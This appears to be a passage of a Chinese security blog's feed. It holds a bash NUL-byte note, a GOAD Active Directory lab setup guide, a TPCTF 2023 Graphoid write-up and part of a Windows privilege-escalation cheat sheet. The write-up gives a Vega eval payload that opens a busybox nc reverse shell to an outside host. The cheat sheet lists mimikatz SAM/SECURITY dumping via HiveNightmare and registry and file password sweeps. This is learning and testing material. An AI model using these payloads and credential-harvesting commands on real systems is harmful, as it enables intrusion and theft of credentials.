- bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange 利用 readarray 可以将带有特殊字符的内容存在数组中，然后再拼接输出。这种方式可以完整获取任意文件的完整内容，即使是二进制文件。 readarray -d $'\0' zArray &lt;/etc/passwd [[ "${zArray[*]}" ]] &amp;&amp; printf '%s\0' "${zArray[@]}" 但在这道题的场景下，readarray 不太好用，如果用来读取连接中的 fd 的话，readarray 会被阻塞住，导致 zArray 无法被赋值，后面的 printf 也就读不出内容。 补充： 参考了其他大佬的 writeup： ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf writeup 作者额外设置了 LC_ALL 环境变量为 C。 LC_ALL=C LC_ALL 环境变量用于覆盖所有其他本地化设置，它通常用于确保在特定程序运行时使用特定的语言环境。C 语言环境是最简单的语言环境，其中字符是单字节的，字符集是 ASCII，排序顺序基于字节值。 加入该环境变量之后，read 就不会将多个字符解析成一个特殊字符，从而解决上面 \x00 缺失的问题，测试脚本如下： #!/bin/bash echo -en "\xf0\x00\x00\x00\x12\x00" | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do printf "%c" "$line" done | xxd echo -en "\xf0\x00\x00\x00\x12\x00" | while LC_ALL=C IFS= read -r -d $'\0' -n 1 line; do if [[ -z $line ]] then echo -ne "\x00" else echo -ne "$line" fi done | xxd 使用二进制文件来测试也可以完全一致，可以说具备通用性了！ 参考 HTB: Interface - 0xdf hacks stuff Arithmetic operation in shell script can be exploited - DEV Community linux - bash can’t store hexvalue 0x00 in variable - Unix &amp; Linux Stack Exchange ctf/2023.12.09-0CTF_TCTF_2023/mathexam - 4/script at 43222e15e7cb74844b2c686c4f32cccf74e7909f · mephi42/ctf]]></summary></entry><entry><title type="html">GOAD 靶场环境搭建</title><link href="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html" rel="alternate" type="text/html" title="GOAD 靶场环境搭建" /><published>2023-11-28T18:29:48+08:00</published><updated>2023-11-28T18:29:48+08:00</updated><id>/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA</id><content type="html" xml:base="/pentest/2023/11/28/GOAD-%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"><![CDATA[<h1 id="goad-靶场搭建">GOAD 靶场搭建</h1>
<p>下面是官方的搭建教程链接：</p>
<ul>
  <li><a href="https://mayfly277.github.io/posts/GOADv2/">Game Of Active Directory v2</a></li>
</ul>

<p>vagrant 下载并启动虚拟机一般没有什么问题。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant up
</code></pre></div></div>

<p>但当我执行 ansible 的命令时</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ansible-playbook main.yml
</code></pre></div></div>
<p>所有条目都是报 No hosts matched, nothing to do 的错误。寻找了其他教程貌似都没有遇到这类的错误：</p>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windows下配置安装GOAD - InfoSec’s Blog</a></li>
</ul>

<p>几个安装教程都是几个月之前的了，在此期间 GOAD 有一些更新，暂且不看更新了哪些内容，查看官方提供的安装脚本 GOAD.sh，在其中搜索 ansible-playbook 可以找到这个脚本是如何运行这部分的内容的：</p>

<p>linux 本地启动</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd </span>ansible

<span class="nb">export </span><span class="nv">ANSIBLE_COMMAND</span><span class="o">=</span><span class="s2">"ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory"</span>

../scripts/provisionning.sh
</code></pre></div></div>

<p>换用上述的命令就可以正常执行了。</p>

<p>如果想使用 docker 的话，可以先 build 镜像。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker build <span class="nt">-t</span> goadansible <span class="nt">--network</span> host <span class="nb">.</span>
</code></pre></div></div>

<p>然后运行，命令如下</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker run <span class="nt">-ti</span> <span class="nt">--rm</span> <span class="nt">--network</span> host <span class="nt">-h</span> goadansible <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/goad <span class="nt">-w</span> /goad/ansible goadansible /bin/bash <span class="nt">-c</span> <span class="s2">"ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh"</span>
</code></pre></div></div>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128021540.png" alt="20231128021540" /></p>

<p>配置期间可能会出现各种各样的错误，这时候只能求助 issue 了，一般性的问题其他人也会碰到：</p>
<ol>
  <li><a href="https://github.com/Orange-Cyberdefense/GOAD/issues/69">Issues · Orange-Cyberdefense/GOAD</a></li>
</ol>

<p>我遇到的是 SRV02 添加 admin 用户时的一个报错，在 issue 里可以看到也有人遇到过相同问题，但没有解决。</p>
<ul>
  <li>https://github.com/Orange-Cyberdefense/GOAD/issues/62</li>
</ul>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231128203931.png" alt="20231128203931" /></p>

<p>最后只能自行解决了，具体步骤可见该 <a href="https://github.com/Orange-Cyberdefense/GOAD/issues/62">issue</a></p>

<h1 id="参考">参考</h1>
<ul>
  <li><a href="https://qusec.cn/posts/G0AD/#7-%E6%8E%A8%E8%8D%90-%E5%88%9B%E5%BB%BAubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA-%E5%AE%89%E8%A3%85ansible-%E5%B9%B6%E9%85%8D%E7%BD%AE%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83">域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE</a></li>
  <li><a href="https://guosec.online/posts/ad6be596.html">Windows下配置安装GOAD - InfoSec’s Blog</a></li>
</ul>]]></content><author><name>DumKiy</name></author><category term="Pentest" /><category term="GOAD" /><category term="Active Directory" /><summary type="html"><![CDATA[GOAD 靶场搭建 下面是官方的搭建教程链接： Game Of Active Directory v2 vagrant 下载并启动虚拟机一般没有什么问题。 vagrant up 但当我执行 ansible 的命令时 ansible-playbook main.yml 所有条目都是报 No hosts matched, nothing to do 的错误。寻找了其他教程貌似都没有遇到这类的错误： 域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE Windows下配置安装GOAD - InfoSec’s Blog 几个安装教程都是几个月之前的了，在此期间 GOAD 有一些更新，暂且不看更新了哪些内容，查看官方提供的安装脚本 GOAD.sh，在其中搜索 ansible-playbook 可以找到这个脚本是如何运行这部分的内容的： linux 本地启动 cd ansible export ANSIBLE_COMMAND="ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory" ../scripts/provisionning.sh 换用上述的命令就可以正常执行了。 如果想使用 docker 的话，可以先 build 镜像。 docker build -t goadansible --network host . 然后运行，命令如下 docker run -ti --rm --network host -h goadansible -v $(pwd):/goad -w /goad/ansible goadansible /bin/bash -c "ANSIBLE_COMMAND='ansible-playbook -i ../ad/GOAD/data/inventory -i ../ad/GOAD/providers/vmware/inventory' ../scripts/provisionning.sh" 配置期间可能会出现各种各样的错误，这时候只能求助 issue 了，一般性的问题其他人也会碰到： Issues · Orange-Cyberdefense/GOAD 我遇到的是 SRV02 添加 admin 用户时的一个报错，在 issue 里可以看到也有人遇到过相同问题，但没有解决。 https://github.com/Orange-Cyberdefense/GOAD/issues/62 最后只能自行解决了，具体步骤可见该 issue 参考 域渗透靶场GOAD(Game Of Active Directory) v2 搭建教程 - NO SYSTEM IS SAFE Windows下配置安装GOAD - InfoSec’s Blog]]></summary></entry><entry><title type="html">TPCTF 2023 graphoid writeup</title><link href="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html" rel="alternate" type="text/html" title="TPCTF 2023 graphoid writeup" /><published>2023-11-27T18:29:48+08:00</published><updated>2023-11-27T18:29:48+08:00</updated><id>/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup</id><content type="html" xml:base="/ctf/2023/11/27/TPCTF2023-%E9%83%A8%E5%88%86-web-Writeup.html"><![CDATA[<p>这个题的思路并不是很明确，给出了一个 MediaWiki 已经废弃的项目：</p>
<ul>
  <li><a href="https://m.mediawiki.org/wiki/Extension:Graph/Graphoid">Extension:Graph/Graphoid - MediaWiki</a></li>
</ul>

<p>Graphoid 用于对用户提供的输入图像定义文件进行渲染，返回图像内容。</p>

<p>由于项目较老，可以考虑使用 dependency-check 先扫一遍历史漏洞。</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dependency-check <span class="nt">-s</span> <span class="nb">.</span> <span class="nt">-o</span> report <span class="nt">-f</span> HTML
</code></pre></div></div>
<p>得到报告之后可以看出历史漏洞很多，但之后结合代码审计的结果看并没有什么用。</p>

<p>项目使用 nodejs 编写，项目需要看的 js 代码并不多：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>└─<span class="nv">$ </span>tree  | <span class="nb">grep </span>js
├── app.js
│   ├── api-util.js
│   ├── swagger-ui.js
│   ├── util.js
│   ├── vega1.js
│   ├── vega2.js
│   └── vega.js
├── npm-shrinkwrap.json
├── package.json
│   ├── graphoid-v1.js
│   ├── graphoid-v2.js
│   ├── info.js
│   └── root.js
│   └── sqlToFiles.js
├── server.js
    │   │   ├── app.js
    │   │   └── spec.js
    │   │   └── info.js
    │       └── graph.js
    ├── index.js
        ├── assert.js
        ├── logStream.js
        └── server.js
</code></pre></div></div>

<p>主体功能及对应的文件如下：</p>
<ol>
  <li>路由功能：
    <ol>
      <li>graphoid-v1.js：v1 版本的接口</li>
      <li>graphoid-v2.js：v2 版本的接口</li>
    </ol>
  </li>
  <li>渲染功能
    <ol>
      <li>vega.js：根据输入的版本信息，决定调用 vega1.js 还是 vega2.js 进行渲染。</li>
      <li>vega1.js</li>
      <li>vega2.js</li>
    </ol>
  </li>
  <li>swagger 文档：访问 /?doc</li>
  <li>系统信息：访问 /?spec</li>
</ol>

<p>主体代码似乎没什么洞，即使 graphoid-v1 中有一个 merge 操作，也并不能造成 prototype pollution。</p>

<p>代码中似乎对 underscore 也进行了调用，underscore 有一个代码执行漏洞：<a href="https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-1081503">Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk</a>，但应该得结合原型链污染才行。</p>

<p>考虑到主体功能还是通过 vega 进行渲染，因此可以去 vega 的仓库看看 issue。找到了几个 xss。其中有一个比较有趣：</p>
<ul>
  <li>https://github.com/vega/vega/issues/3018</li>
</ul>

<p>这个 issue 的 payload 曾在 hxp2020 hackme 这道题中用于触发 XSS。</p>

<p>由于 Graphoid 中的 vega 比较老，应该是 3.2.1 版本，可以关注 vega2 的 payload：</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231127212739.png" alt="20231127212739" /></p>

<p>这个 payload 在 https://vega.github.io/vega-editor/?mode=vega 中是可以正常触发 xss 的。</p>

<p>这个 payload 只能是 XSS 吗？Graphoid 中的 vaga 可是运行在服务端，既然该漏洞能够通过 eval 执行执行任意 JavaScript 代码，那就是 RCE 了。</p>

<p>测试这个 poc 后确实可以执行代码，稍作更改即可反弹 shell。（平台更新了一次附件，第一次的附件搭建出来的环境，png 接口也可以触发，且环境中有 curl 可以带出来。更新后的附件搭建出来的环境，png 接口总会报错，但 svg 接口可以正常触发，另外环境没有 curl 了，但是有 busybox 可以 nc 反弹 shell。</p>

<p>v2 接口发送如下的 payload。</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
  </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
    </span><span class="p">{</span><span class="w">
      </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"data"</span><span class="p">,</span><span class="w">
      </span><span class="nl">"values"</span><span class="p">:</span><span class="w"> </span><span class="p">[{}],</span><span class="w">
      </span><span class="nl">"transform"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"filter"</span><span class="p">,</span><span class="w"> </span><span class="nl">"test"</span><span class="p">:</span><span class="w"> </span><span class="s2">"(0//1/)-'</span><span class="se">\\\n</span><span class="s2">,console.log(process.mainModule.require(</span><span class="se">\"</span><span class="s2">child_process</span><span class="se">\"</span><span class="s2">).execSync(</span><span class="se">\"</span><span class="s2">busybox nc xxxx 9001 -e ash</span><span class="se">\"</span><span class="s2">)),console.log(222))))//'"</span><span class="p">}</span><span class="w">
      </span><span class="p">]</span><span class="w">
    </span><span class="p">}</span><span class="w">
  </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>]]></content><author><name>DumKiy</name></author><category term="CTF" /><category term="nodejs" /><category term="vega" /><summary type="html"><![CDATA[这个题的思路并不是很明确，给出了一个 MediaWiki 已经废弃的项目： Extension:Graph/Graphoid - MediaWiki Graphoid 用于对用户提供的输入图像定义文件进行渲染，返回图像内容。 由于项目较老，可以考虑使用 dependency-check 先扫一遍历史漏洞。 dependency-check -s . -o report -f HTML 得到报告之后可以看出历史漏洞很多，但之后结合代码审计的结果看并没有什么用。 项目使用 nodejs 编写，项目需要看的 js 代码并不多： └─$ tree | grep js ├── app.js │ ├── api-util.js │ ├── swagger-ui.js │ ├── util.js │ ├── vega1.js │ ├── vega2.js │ └── vega.js ├── npm-shrinkwrap.json ├── package.json │ ├── graphoid-v1.js │ ├── graphoid-v2.js │ ├── info.js │ └── root.js │ └── sqlToFiles.js ├── server.js │ │ ├── app.js │ │ └── spec.js │ │ └── info.js │ └── graph.js ├── index.js ├── assert.js ├── logStream.js └── server.js 主体功能及对应的文件如下： 路由功能： graphoid-v1.js：v1 版本的接口 graphoid-v2.js：v2 版本的接口 渲染功能 vega.js：根据输入的版本信息，决定调用 vega1.js 还是 vega2.js 进行渲染。 vega1.js vega2.js swagger 文档：访问 /?doc 系统信息：访问 /?spec 主体代码似乎没什么洞，即使 graphoid-v1 中有一个 merge 操作，也并不能造成 prototype pollution。 代码中似乎对 underscore 也进行了调用，underscore 有一个代码执行漏洞：Arbitrary Code Injection in org.webjars.npm:underscore - CVE-2021-23358 - Snyk，但应该得结合原型链污染才行。 考虑到主体功能还是通过 vega 进行渲染，因此可以去 vega 的仓库看看 issue。找到了几个 xss。其中有一个比较有趣： https://github.com/vega/vega/issues/3018 这个 issue 的 payload 曾在 hxp2020 hackme 这道题中用于触发 XSS。 由于 Graphoid 中的 vega 比较老，应该是 3.2.1 版本，可以关注 vega2 的 payload： 这个 payload 在 https://vega.github.io/vega-editor/?mode=vega 中是可以正常触发 xss 的。 这个 payload 只能是 XSS 吗？Graphoid 中的 vaga 可是运行在服务端，既然该漏洞能够通过 eval 执行执行任意 JavaScript 代码，那就是 RCE 了。 测试这个 poc 后确实可以执行代码，稍作更改即可反弹 shell。（平台更新了一次附件，第一次的附件搭建出来的环境，png 接口也可以触发，且环境中有 curl 可以带出来。更新后的附件搭建出来的环境，png 接口总会报错，但 svg 接口可以正常触发，另外环境没有 curl 了，但是有 busybox 可以 nc 反弹 shell。 v2 接口发送如下的 payload。 { "data": [ { "name": "data", "values": [{}], "transform": [ {"type": "filter", "test": "(0//1/)-'\\\n,console.log(process.mainModule.require(\"child_process\").execSync(\"busybox nc xxxx 9001 -e ash\")),console.log(222))))//'"} ] } ] }]]></summary></entry><entry><title type="html">Windows 提权知识点</title><link href="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html" rel="alternate" type="text/html" title="Windows 提权知识点" /><published>2023-11-20T13:34:21+08:00</published><updated>2023-11-20T13:34:21+08:00</updated><id>/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9</id><content type="html" xml:base="/pentest/2023/11/20/Windows-%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86%E7%82%B9.html"><![CDATA[<h1 id="windows-本地提权">Windows 本地提权</h1>
<h2 id="利用导出或查找密码提权">利用导出或查找密码提权</h2>
<p>主要思路在于使用 mimikatz 或者从配置文件、注册表项中排查密码。</p>

<h3 id="sam-and-system-fileswin10-及以下">SAM and SYSTEM files(win10 及以下)</h3>
<p>安全帐户管理器 (SAM)，通常是安全帐户管理器，是一个数据库文件。<br />
用户密码以哈希格式存储在注册表配置单元中，作为 LM 哈希或 NTLM 哈希。<br />
该文件位于 %SystemRoot%/system32/config/SAM 中，并安装在 HKLM/SAM 上。</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Usually %SYSTEMROOT% = C:\Windows</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SAM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\repair\system</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\SYSTEM</span><span class="w">
</span><span class="o">%</span><span class="n">SYSTEMROOT</span><span class="o">%</span><span class="nx">\System32\config\RegBack\system</span><span class="w">
</span></code></pre></div></div>

<p><strong>直接使用 mimikatz 提取即可，无需使用 pwddump</strong></p>

<h3 id="hivenightmarewindows-10-and-11">HiveNightmare(Windows 10 and 11)</h3>
<p>不影响 Server。</p>

<blockquote>
  <p>CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user</p>
</blockquote>

<p>使用 <code class="language-plaintext highlighter-rouge">icacls</code> 命令检查漏洞是否存在</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Windows\System32</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">icacls</span><span class="w"> </span><span class="nx">config\SAM</span><span class="w">
</span><span class="n">config\SAM</span><span class="w"> </span><span class="nx">BUILTIN\Administrators:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">NT</span><span class="w"> </span><span class="nx">AUTHORITY\SYSTEM:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">F</span><span class="p">)</span><span class="w">
           </span><span class="n">BUILTIN\Users:</span><span class="p">(</span><span class="n">I</span><span class="p">)(</span><span class="n">RX</span><span class="p">)</span><span class="w">    </span><span class="err">&lt;</span><span class="o">--</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">wrong</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">regular</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">should</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">have</span><span class="w"> </span><span class="nx">read</span><span class="w"> </span><span class="nx">access</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">token::whoami</span><span class="w"> </span><span class="nx">/full</span><span class="w">

</span><span class="c"># List shadow copies available</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">misc::shadowcopies</span><span class="w">

</span><span class="c"># Extract account from SAM databases</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::sam</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/sam:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM</span><span class="w">

</span><span class="c"># Extract secrets from SECURITY</span><span class="w">
</span><span class="n">mimikatz</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">lsadump::secrets</span><span class="w"> </span><span class="nx">/system:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM</span><span class="w"> </span><span class="nx">/security:\\</span><span class="nf">?</span><span class="nx">\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li><a href="https://teamssix.com/210725-074847.html#!">【漏洞复现】CVE-2021-36934 Windows 提权漏洞复现 - TeamsSix</a></li>
</ul>

<h3 id="搜索文件内容中的-password">搜索文件内容中的 password</h3>
<p>在 .xml, .ini, .txt .config 等文件中搜索 Password</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">C:\</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/SI</span><span class="w"> </span><span class="nx">/M</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w">
</span><span class="nx">findstr</span><span class="w"> </span><span class="nx">/si</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="o">*.</span><span class="nf">xml</span><span class="w"> </span><span class="o">*.</span><span class="nf">ini</span><span class="w"> </span><span class="o">*.</span><span class="nf">txt</span><span class="w"> </span><span class="o">*.</span><span class="nf">config</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">results.txt</span><span class="w">
</span><span class="n">findstr</span><span class="w"> </span><span class="nx">/spin</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="o">*.*</span><span class="w">
</span></code></pre></div></div>

<p>在远程地址例如 SMB Shares 或 SharePoint 搜索</p>

<ul>
  <li>Search passwords in SharePoint: <a href="https://github.com/nheiniger/SnaffPoint">nheiniger/SnaffPoint</a> (must be compiled first, for referencing issue see: https://github.com/nheiniger/SnaffPoint/pull/6)</li>
</ul>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># First, retrieve a token</span><span class="w">
</span><span class="c">## Method 1: using SnaffPoint binary</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="o">.</span><span class="n">\GetBearerToken.exe</span><span class="w"> </span><span class="nx">https://your.sharepoint.com</span><span class="p">)</span><span class="w">
</span><span class="c">## Method 2: using AADInternals</span><span class="w">
</span><span class="n">Install-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w"> </span><span class="nt">-Scope</span><span class="w"> </span><span class="nx">CurrentUser</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">AADInternals</span><span class="w">
</span><span class="nv">$token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Get-AADIntAccessToken</span><span class="w"> </span><span class="nt">-ClientId</span><span class="w"> </span><span class="s2">"9bc3ab49-b65d-410a-85ad-de819febfddc"</span><span class="w"> </span><span class="nt">-Tenant</span><span class="w"> </span><span class="s2">"your.onmicrosoft.com"</span><span class="w"> </span><span class="nt">-Resource</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="p">)</span><span class="w">

</span><span class="c"># Second, search on Sharepoint</span><span class="w">
</span><span class="c">## Method 1: using search strings in ./presets dir</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w">
</span><span class="c">## Method 2: using search string in command line</span><span class="w">
</span><span class="c">### -l uses FQL search, see: https://learn.microsoft.com/en-us/sharepoint/dev/general-development/fast-query-language-fql-syntax-reference</span><span class="w">
</span><span class="o">.</span><span class="n">\SnaffPoint.exe</span><span class="w"> </span><span class="nt">-u</span><span class="w"> </span><span class="s2">"https://your.sharepoint.com"</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nv">$token</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-q</span><span class="w"> </span><span class="s2">"filename:.config"</span><span class="w">
</span></code></pre></div></div>

<ul>
  <li>Search passwords in SMB Shares: <a href="https://github.com/SnaffCon/Snaffler">SnaffCon/Snaffler</a></li>
</ul>

<h3 id="搜索和-password-相关的文件名">搜索和 password 相关的文件名</h3>
<div class="language-bat highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> <span class="na">/S /B </span><span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.txt <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.xml <span class="o">==</span> <span class="o">*</span><span class="kd">pass</span><span class="o">*</span>.ini <span class="o">==</span> <span class="o">*</span><span class="kd">cred</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span><span class="kd">vnc</span><span class="o">*</span> <span class="o">==</span> <span class="o">*</span>.config<span class="o">*</span>
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="kd">user</span>.txt
<span class="nb">where</span> <span class="na">/R </span><span class="kd">C</span>:\ <span class="o">*</span>.ini
</code></pre></div></div>

<h3 id="搜索和-password-相关的注册表">搜索和 password 相关的注册表</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">
</span><span class="n">REG</span><span class="w"> </span><span class="nx">QUERY</span><span class="w"> </span><span class="nx">HKCU</span><span class="w"> </span><span class="nx">/F</span><span class="w"> </span><span class="s2">"password"</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="nx">/K</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="c"># Windows Autologin</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"</span><span class="w"> </span><span class="nx">2</span><span class="err">&gt;</span><span class="nx">nul</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">findstr</span><span class="w"> </span><span class="s2">"DefaultUserName DefaultDomainName DefaultPassword"</span><span class="w"> 
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKLM\SYSTEM\Current\ControlSet\Services\SNMP"</span><span class="w"> </span><span class="c"># SNMP parameters</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\SimonTatham\PuTTY\Sessions"</span><span class="w"> </span><span class="c"># Putty clear text proxy credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="s2">"HKCU\Software\ORL\WinVNC3\Password"</span><span class="w"> </span><span class="c"># VNC credentials</span><span class="w">
</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">password</span><span class="w">

</span><span class="n">reg</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">HKLM</span><span class="w"> </span><span class="nx">/f</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_SZ</span><span class="w"> </span><span class="nx">/s</span><span class="w">
